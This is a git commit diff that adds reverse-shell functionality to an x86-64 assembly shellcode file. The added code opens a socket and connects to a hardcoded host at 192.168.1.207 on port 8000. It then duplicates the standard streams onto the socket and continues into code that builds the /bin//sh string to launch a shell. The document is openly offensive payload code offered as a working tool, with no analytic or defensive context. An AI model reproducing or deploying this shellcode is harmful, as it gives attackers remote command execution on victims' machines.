1acd0d3c618187e199b4933545a691b8ec4b7b79
nick <nick@nick.nick>
2026-05-27 01:42:03 +0300

    Added the Revrse shell Functionality

--- ShellCode.asm
+++ ShellCode.asm
@@ -3,6 +3,56 @@ section .text
 global _start
 _start:
 
+;socket
+xor rax, rax
+xor rdi, rdi
+xor rsi, rsi
+xor rdx, rdx
+
+; Create Sokcet int socket(int domain, int type, int protocol);
+mov al, 41 ;__NR_socket
+mov dil, 2 ; int domain
+mov sil, 1 ; int type
+syscall
+
+push rax ;push the file descriptor
+
+;Connect Call  int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
+xor rax, rax
+xor rsi, rsi
+xor rdi, rdi
+xor rdx, rdx ;xor last argument
+
+pop rdi ;pop it
+
+mov rbx, 0xCF01A8C0401F0002 ; push 192.168.1.207 8000 AF_INET NEED TO FIX THIS
+push rbx
+
+mov al, 42 ;connect syscall
+mov dl, 16 ; addrlen
+mov rsi, rsp
+syscall
+
+;dup2
+dup2:
+xor rax, rax
+xor rsi, rsi
+xor rdx, rdx
+
+mov al, 33
+mov sil, 0 
+syscall
+
+mov al, 33
+mov sil, 1
+syscall
+
+mov al, 33
+mov sil, 2
+syscall
+
+
+;Time for Shell
 xor rax, rax                ;set rax to 0
 push rax                    ;push the 0 for the end of the string
 mov rax, 0x68732f2f6e69622f ;mov the string /bin//sh to the rax register
